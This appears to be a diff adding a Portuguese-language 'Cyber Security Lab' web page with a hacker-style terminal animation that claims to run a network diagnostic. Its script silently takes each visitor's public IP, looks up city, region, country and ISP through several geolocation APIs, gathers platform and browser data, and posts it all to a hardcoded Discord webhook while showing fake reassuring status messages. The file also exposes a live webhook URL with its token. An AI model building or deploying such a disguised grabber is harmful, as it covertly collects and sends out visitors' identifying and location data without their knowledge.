@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Security Lab</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000;
+            color: #00ff00;
+            font-family: 'Courier Prime', monospace;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.1;
+        }
+        
+        .terminal {
+            position: relative;
+            z-index: 2;
+            padding: 20px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .terminal-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .terminal-title {
+            font-size: 2.5em;
+            font-weight: bold;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 10px;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        .terminal-subtitle {
+            font-size: 1.2em;
+            opacity: 0.8;
+        }
+        
+        .console {
+            background: rgba(0, 20, 0, 0.9);
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            padding: 20px;
+            width: 90%;
+            max-width: 800px;
+            min-height: 300px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+        }
+        
+        .console-line {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            opacity: 0;
+            animation: typeIn 0.5s ease-in forwards;
+        }
+        
+        .prompt {
+            color: #00ff00;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+        
+        .command-text {
+            color: #00ff00;
+        }
+        
+        .output {
+            color: #00ff88;
+            margin-left: 20px;
+        }
+        
+        .error {
+            color: #ff0000;
+        }
+        
+        .warning {
+            color: #ffff00;
+        }
+        
+        .cursor {
+            display: inline-block;
+            background: #00ff00;
+            width: 10px;
+            height: 20px;
+            animation: blink 1s infinite;
+        }
+        
+        .status {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 20, 0, 0.9);
+            border: 1px solid #00ff00;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 0.9em;
+            z-index: 3;
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 0 0 10px #00ff00; }
+            to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
+        }
+        
+        @keyframes typeIn {
+            to { opacity: 1; }
+        }
+        
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+        
+        .matrix-char {
+            position: absolute;
+            color: #00ff00;
+            font-family: 'Courier Prime', monospace;
+            font-size: 14px;
+            animation: matrixFall linear infinite;
+        }
+        
+        @keyframes matrixFall {
+            0% {
+                transform: translateY(-100vh);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh);
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <canvas class="matrix-bg" id="matrixCanvas"></canvas>
+    
+    <div class="status" id="status">
+        <div>STATUS: <span style="color: #00ff00;">ONLINE</span></div>
+        <div>ANÁLISE: <span id="ipDisplay">Em progresso...</span></div>
+        <div>RELATÓRIO: <span id="webhookStatus" style="color: #ffff00;">PROCESSANDO</span></div>
+    </div>
+    
+    <div class="terminal">
+        <div class="terminal-header">
+            <div class="terminal-title">CYBER SECURITY LAB</div>
+            <div class="terminal-subtitle">Iniciando diagnóstico de sistema...</div>
+        </div>
+        
+        <div class="console" id="console">
+            <div class="console-line" style="animation-delay: 0.5s;">
+                <span class="prompt">admin@lab:~$</span>
+                <span class="command-text">run_network_diagnostic.py</span>
+            </div>
+            <div class="console-line" style="animation-delay: 1s;">
+                <span class="output">Iniciando análise de conectividade...</span>
+            </div>
+            <div class="console-line" style="animation-delay: 1.5s;">
+                <span class="output">Verificando protocolos de rede...</span>
+            </div>
+            <div class="console-line" style="animation-delay: 2s;">
+                <span class="output">Coletando informações de diagnóstico...</span>
+            </div>
+            <div class="console-line" style="animation-delay: 2.5s;">
+                <span class="prompt">></span>
+                <span class="output">Protocolo de segurança: <span id="ipInConsole">Verificando...</span></span>
+            </div>
+            <div class="console-line" style="animation-delay: 3s;">
+                <span class="prompt">></span>
+                <span class="output">Salvando dados de diagnóstico...</span>
+            </div>
+            <div class="console-line" style="animation-delay: 3.5s;">
+                <span class="prompt">></span>
+                <span class="output" id="webhookResult">Status: Preparando relatório...</span>
+            </div>
+            <div class="console-line" style="animation-delay: 4s;">
+                <span class="prompt">admin@lab:~$</span>
+                <span class="cursor"></span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // CONFIGURAÇÃO DO WEBHOOK DO DISCORD
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1403003529802551337/VbENA3qW2L96tY9OieJB2AxKOUgphzG-nBmwTFzrb3aHr8qBEoLfnrNLMotnbe5OEP2p';
+        
+        // Variáveis globais
+        let userIP = '';
+        let locationData = {};
+        
+        // Efeito Matrix de fundo
+        function createMatrixEffect() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            const charArray = chars.split('');
+            
+            const fontSize = 14;
+            const columns = canvas.width / fontSize;
+            const drops = [];
+            
+            for (let x = 0; x < columns; x++) {
+                drops[x] = 1;
+            }
+            
+            function draw() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = '#00ff00';
+                ctx.font = fontSize + 'px Courier Prime';
+                
+                for (let i = 0; i < drops.length; i++) {
+                    const text = charArray[Math.floor(Math.random() * charArray.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+            
+            setInterval(draw, 33);
+        }
+        
+        // Função para obter IP público
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Erro ao obter IP:', error);
+                return 'Erro ao obter IP';
+            }
+        }
+        
+        // Função para obter informações de localização
+        async function getLocationInfo(ip) {
+            try {
+                // Tenta múltiplas APIs para maior chance de sucesso
+                let locationData = {};
+                
+                // Primeira tentativa: ipapi.co
+                try {
+                    const response1 = await fetch(`https://ipapi.co/${ip}/json/`);
+                    if (response1.ok) {
+                        const data1 = await response1.json();
+                        if (data1.city && data1.region && data1.country_name) {
+                            locationData = {
+                                city: data1.city,
+                                regionName: data1.region,
+                                country: data1.country_name,
+                                isp: data1.org || 'Não disponível'
+                            };
+                        }
+                    }
+                } catch (e) {}
+                
+                // Segunda tentativa: ipgeolocation.io (se a primeira falhou)
+                if (!locationData.city) {
+                    try {
+                        const response2 = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip=${ip}`);
+                        if (response2.ok) {
+                            const data2 = await response2.json();
+                            if (data2.city && data2.state_prov && data2.country_name) {
+                                locationData = {
+                                    city: data2.city,
+                                    regionName: data2.state_prov,
+                                    country: data2.country_name,
+                                    isp: data2.isp || 'Não disponível'
+                                };
+                            }
+                        }
+                    } catch (e) {}
+                }
+                
+                // Terceira tentativa: ip-api.com (se as anteriores falharam)
+                if (!locationData.city) {
+                    try {
+                        const response3 = await fetch(`http://ip-api.com/json/${ip}`);
+                        if (response3.ok) {
+                            const data3 = await response3.json();
+                            if (data3.status === 'success') {
+                                locationData = {
+                                    city: data3.city,
+                                    regionName: data3.regionName,
+                                    country: data3.country,
+                                    isp: data3.isp || 'Não disponível'
+                                };
+                            }
+                        }
+                    } catch (e) {}
+                }
+                
+                return locationData;
+            } catch (error) {
+                console.error('Erro ao obter localização:', error);
+                return {};
+            }
+        }
+        
+        // Função para enviar dados para Discord
+        async function sendToDiscord(ip, location) {
+            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'SEU_WEBHOOK_URL_AQUI') {
+                console.log('Webhook URL não configurada');
+                document.getElementById('webhookStatus').textContent = 'ERRO CONFIG';
+                document.getElementById('webhookStatus').style.color = '#ff0000';
+                document.getElementById('webhookResult').textContent = 'Erro: Sistema de relatório não configurado';
+                document.getElementById('webhookResult').style.color = '#ff0000';
+                return;
+            }
+            
+            const embed = {
+                title: "🔐 ANÁLISE DE SEGURANÇA CONCLUÍDA",
+                description: "Sistema de verificação de integridade executado com sucesso",
+                color: 0x00ff41,
+                timestamp: new Date().toISOString(),
+                fields: [
+                    {
+                        name: "🌐 Origem da Conexão",
+                        value: `\`${ip}\``,
+                        inline: true
+                    },
+                    {
+                        name: "📍 Região Detectada",
+                        value: location.city ? `${location.city}, ${location.regionName}, ${location.country}` : 'Conexão protegida detectada',
+                        inline: true
+                    },
+                    {
+                        name: "🏢 Provedor de Rede",
+                        value: location.isp || 'ISP não identificado',
+                        inline: true
+                    },
+                    {
+                        name: "⏰ Timestamp da Análise",
+                        value: new Date().toLocaleString('pt-BR'),
+                        inline: true
+                    },
+                    {
+                        name: "🛡️ Status da Verificação",
+                        value: "✅ Análise de segurança aprovada",
+                        inline: true
+                    },
+                    {
+                        name: "🔧 Configuração do Cliente",
+                        value: `Sistema: ${navigator.platform || 'Não identificado'}\nNavegador: ${navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length-1] || 'Não identificado'}`,
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: "CyberSec Lab • Verificação Automática de Integridade"
+                }
+            };
+            
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed]
+                    })
+                });
+                
+                if (response.ok) {
+                    document.getElementById('webhookStatus').textContent = 'APROVADO';
+                    document.getElementById('webhookStatus').style.color = '#00ff00';
+                    document.getElementById('webhookResult').textContent = 'Verificação de segurança concluída com êxito';
+                    document.getElementById('webhookResult').style.color = '#00ff00';
+                } else {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+            } catch (error) {
+                console.error('Erro ao enviar para Discord:', error);
+                document.getElementById('webhookStatus').textContent = 'ERRO';
+                document.getElementById('webhookStatus').style.color = '#ff0000';
+                document.getElementById('webhookResult').textContent = `Erro no envio: ${error.message}`;
+                document.getElementById('webhookResult').style.color = '#ff0000';
+            }
+        }
+        
+        // Função principal que executa ao carregar a página
+        async function initializeSystem() {
+            // Inicia efeito Matrix
+            createMatrixEffect();
+            
+            // Aguarda um pouco antes de começar a obter o IP
+            setTimeout(async () => {
+                // Obtém o IP
+                userIP = await getPublicIP();
+                document.getElementById('ipDisplay').textContent = 'ANALISADO';
+                document.getElementById('ipInConsole').textContent = 'CERTIFICADO SSL';
+                
+                // Obtém informações de localização
+                locationData = await getLocationInfo(userIP);
+                
+                // Aguarda mais um pouco antes de enviar para Discord
+                setTimeout(async () => {
+                    await sendToDiscord(userIP, locationData);
+                }, 1000);
+                
+            }, 2000);
+        }
+        
+        // Inicia o sistema quando a página carrega
+        window.addEventListener('load', initializeSystem);
+        
+        // Redimensiona o canvas quando a janela muda de tamanho
+        window.addEventListener('resize', () => {
+            const canvas = document.getElementById('matrixCanvas');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+    </script>
+</body>
+</html>
